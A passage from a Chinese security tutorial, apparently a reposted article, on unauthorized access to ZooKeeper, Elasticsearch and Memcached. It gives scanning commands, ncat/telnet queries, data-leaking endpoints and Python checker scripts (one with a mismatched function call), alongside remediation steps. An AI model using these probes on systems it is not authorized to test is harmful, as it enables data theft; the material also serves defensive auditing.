inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0/24 &nbsp;
grep "Ports: 2181/open/tcp" zookeeper.gnmap | cut -f 2 -d ' ' &gt; Live.txt</code><br  /></pre><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.4582172701949861" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/20_wQ7zYdeTh3KXA3NOiaLD16ficFdnvA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUubP2acWRS6jlUGKSeciaTr7nRlnwQ7zYdeTh3KXA3NOiaLD16ficFdnvA/640?wx_fmt=png'" data-type="png" data-w="2872" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.攻击获取信息</strong><br  /></h4><ul style="" class=" list-paddingleft-2"><li><p style="margin-top: 16px;margin-bottom: 24px;">stat：列出关于性能和连接的客户端的统计信息。<br  />echo stat |ncat 127.0.0.1 2181</p></li><li><p style="margin-top: 16px;margin-bottom: 24px;">ruok：测试服务器是否运行在非错误状态。<br  />echo ruok |ncat 127.0.0.1 2181</p></li><li><p style="margin-top: 16px;margin-bottom: 24px;">reqs：列出未完成的请求。<br  />echo reqs |ncat 127.0.0.1 2181</p></li><li><p style="margin-top: 16px;margin-bottom: 24px;">envi：打印有关服务环境的详细信息。<br  />echo envi |ncat 127.0.0.1 2181</p></li></ul><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">dump：列出未完成的会话和临时节点。<br  />echo dump |ncat 127.0.0.1 2181</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.防范措施</strong></h4><ul style="" class=" list-paddingleft-2"><li><p>禁止把Zookeeper直接暴露在公网</p></li><li><p>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</p></li></ul><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x05 Elasticsearch未授权访问</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.熟悉的响应</strong>&nbsp;You Know, for Search</h4><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">$ curl http://127.0.0.1:9200/_cat/indices/

{ "status" : 200, "name" : "Flake", "cluster_name" : "elasticsearch", "version" : {"number" : "1.4.1"," "build_hash" : "b88f43fc40b0bcd7f173xxxxx2e97816de80b19", "build_timestamp" : "2015-07-29T09:54:16Z", "build_snapshot" : false, "lucene_version" : "4.10.4"}, "tagline" : "You Know, for Search"}</code></pre><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.漏洞测试</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。<br  /><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">http://localhost:9200/_cat/indices</code>&nbsp;里面的indices包含了_river一般就是安装了river了。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">http://localhost:9200/_plugin/head/&nbsp;web管理界面<br  />http://localhost:9200/_cat/indices<br  />http://localhost:9200/_river/_search&nbsp;查看数据库敏感信息<br  />http://localhost:9200/_nodes&nbsp;查看节点数据</p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.4015625" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/21_DyxSYw0fA09yRUl3FvG46C9op2ibxw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBU7hv3HCuNhkM25S1NUicsibkh2CMDyxSYw0fA09yRUl3FvG46C9op2ibxw/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.5398478173808571" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/22_nvFPYiaE9GX89UznSUTkY9pCKXJWgQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUmRuCQ61OianCnOSzKBNdJul7MCnvFPYiaE9GX89UznSUTkY9pCKXJWgQ/640?wx_fmt=png'" data-type="png" data-w="2497" style=""  /></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">##! /usr/bin/env python
## _*_ &nbsp;coding:utf-8 _*_

import requests
def Elasticsearch_check(ip, port=9200, timeout=5):
 &nbsp; &nbsp;try:
 &nbsp; &nbsp;　　url = "http://"+ip+":"+str(port)+"/_cat"
 &nbsp; &nbsp;　　response = requests.get(url) 
 &nbsp; &nbsp;except:
 &nbsp; &nbsp;　　pass
 &nbsp; &nbsp;if "/_cat/master" in response.content:
 &nbsp; &nbsp;　　print '[+] Elasticsearch Unauthorized: ' +ip+':'+str(port)

if __name__ == '__main__':
 &nbsp; &nbsp;Elasticsearch_check("127.0.0.1")</code><br  /></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://www.secpulse.com/archives/46394.html</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.漏洞修复</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">(1)、默认开启的9200端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问9200端口。</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">// accept
## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 9200 -j ACCEPT
## iptables -A INPUT -p udp -s 127.0.0.1 --dport 9200 -j ACCEPT

// drop
## iptables -I INPUT -p tcp --dport 9200 -j DROP
## iptables -I INPUT -p udp --dport 9200 -j DROP

// 保存规则并重启 iptables
## service iptables save
## service iptables restart</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">(2)、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。<br  />https://www.jianshu.com/p/7ec26c13abbb<br  />https://www.sojson.com/blog/213.html<br  />(3)、限制IP访问，绑定固定IP<br  />(4)、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install [github-name]/repo-name。同时需要注意增加验证后，请勿使用弱口令。 在config/elasticsearch.yml中为9200端口设置认证：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">http.basic.enabled &nbsp; &nbsp; true &nbsp; &nbsp; ##开关，开启会接管全部HTTP连接
http.basic.user &nbsp; &nbsp; "admin" &nbsp; &nbsp; ##账号
http.basic.password &nbsp; &nbsp; "admin_pw" &nbsp; &nbsp; ##密码
http.basic.ipwhitelist &nbsp; &nbsp; ["localhost", "127.0.0.1"] &nbsp; &nbsp; ##白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则
http.basic.trusted_proxy_chains &nbsp; &nbsp; [] &nbsp; &nbsp; ##信任代理列表
http.basic.log &nbsp; &nbsp; false &nbsp; &nbsp; ##把无授权的访问事件添加到ES的日志
http.basic.xforward &nbsp; &nbsp; "" &nbsp; &nbsp; ##记载代理路径的header字段名</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf<br  />https://blog.csdn.net/u011419453/article/details/39395627</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x06 Memcache未授权访问</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.扫描探测</strong></h4><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.4396984924623116" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/23_24OOjicRH1ZfGYlYCxraNOYppWLlbg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUocI25mPrBtsFmEmlDIEfG3tS624OOjicRH1ZfGYlYCxraNOYppWLlbg/640?wx_fmt=png'" data-type="png" data-w="2388" style=""  /></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">##! /usr/bin/env python
## _*_ &nbsp;coding:utf-8 _*_
def Memcache_check(ip, port=11211, timeout=5):
 &nbsp; &nbsp;try:
 &nbsp; &nbsp; &nbsp; &nbsp;socket.setdefaulttimeout(timeout)
 &nbsp; &nbsp; &nbsp; &nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 &nbsp; &nbsp; &nbsp; &nbsp;s.connect((ip, int(port)))
 &nbsp; &nbsp; &nbsp; &nbsp;s.send("stats\r\n")
 &nbsp; &nbsp; &nbsp; &nbsp;result = s.recv(1024)
 &nbsp; &nbsp; &nbsp; &nbsp;if "STAT version" in result:
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print '[+] Memcache Unauthorized: ' +ip+':'+str(port)
 &nbsp; &nbsp;except Exception, e:
 &nbsp; &nbsp; &nbsp; &nbsp;pass
if __name__ == '__main__':
 &nbsp; &nbsp;Elasticsearch_check("127.0.0.1")</code><br  /></pre><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.攻击利用</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.1 基础部分</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">通过一个<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">cheat sheet</code>了解一下Memcached的协议。Memcached的语法由如下元素组成</p><ul style="" class=" list-paddingleft-2"><li><p>{COMMAND}0x20{ARGUMENT}(LF|CRLF)</p></li></ul><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">command字段有如下几条命令</p><ul style="" class=" list-paddingleft-2"><li><p>存储操作(set, add, replace, append, prepend, cas)</p></li><li><p>检索操作 (get, gets)</p></li><li><p>删除操作 (delete)</p></li><li><p>增减操作 (incr, decr)</p></li><li><p>touch</p></li><li><p>slabs reassign</p></li><li><p>slabs automove</p></li><li><p>lru_crawler</p></li><li><p>统计操作(stats items, slabs, cachedump)</p></li><li><p>其他操作 (version, flush_all, quit)</p></li></ul><hr style="margin-top: 15px;margin-bottom: 15px;border-top: 0px;border-right: 0px;border-left: 0px;border-bottom-style: solid;border-bottom-color: rgb(221, 221, 221);box-sizing: content-box;height: 0px;background: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;"  /><table width="770" style="width: 556px;"><thead style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><th style="box-sizing: border-box;padding: 6px 13px;border-top-width: 1px;border-top-color: rgb(221, 221, 221);">Command</th><th style="box-sizing: border-box;padding: 6px 13px;border-top-width: 1px;border-top-color: rgb(221, 221, 221);">描述</th><th style="box-sizing: border-box;padding: 6px 13px;border-top-width: 1px;border-top-color: rgb(221, 221, 221);">实例</th></tr></thead><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">get</td><td style="box-sizing: border-box;padding: 6px 13px;">读某个值</td><td style="box-sizing: border-box;padding: 6px 13px;">get mykey</td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">set</td><td style="box-sizing: border-box;padding: 6px 13px;">强制设置某个键值</td><td style="box-sizing: border-box;padding: 6px 13px;">set mykey 0 60 5</td></tr><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">add</td><td style="box-sizing: border-box;padding: 6px 13px;">添加新键值对</td><td style="box-sizing: border-box;padding: 6px 13px;">add newkey 0 60 5</td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">replace</td><td style="box-sizing: border-box;padding: 6px 13px;">覆盖已经存在的key</td><td style="box-sizing: border-box;padding: 6px 13px;">replace key 0 60 5</td></tr><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">flush_all</td><td style="box-sizing: border-box;padding: 6px 13px;">让所有条目失效</td><td style="box-sizing: border-box;padding: 6px 13px;">flush_all</td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">stats</td><td style="box-sizing: border-box;padding: 6px 13px;">打印当前状态</td><td style="box-sizing: border-box;padding: 6px 13px;">stats</td></tr><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">stats malloc</td><td style="box-sizing: border-box;padding: 6px 13px;">打印内存状态</td><td style="box-sizing: border-box;padding: 6px 13px;">stats malloc</td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">version</td><td style="box-sizing: border-box;padding: 6px 13px;">打印Memcached版本</td><td style="box-sizing: border-box;padding: 6px 13px;">version</td></tr></tbody></table><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">stats &nbsp;//查看memcache 服务状态
stats items &nbsp;//查看所有items
stats cachedump 32 0 &nbsp;//获得缓存key
get :state:264861539228401373:261588 &nbsp; //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.2 建立连接并获取信息</strong><br  /><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">telnet &lt;target&gt; 11211</code>，或<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">nc -vv &lt;target&gt; 11211</code>，无需用户名密码，可以直接连接memcache 服务的11211端口。<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.5995975855130785" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/24_I06P1AOticYaEInkePmHxkWM8OBvcw.png" 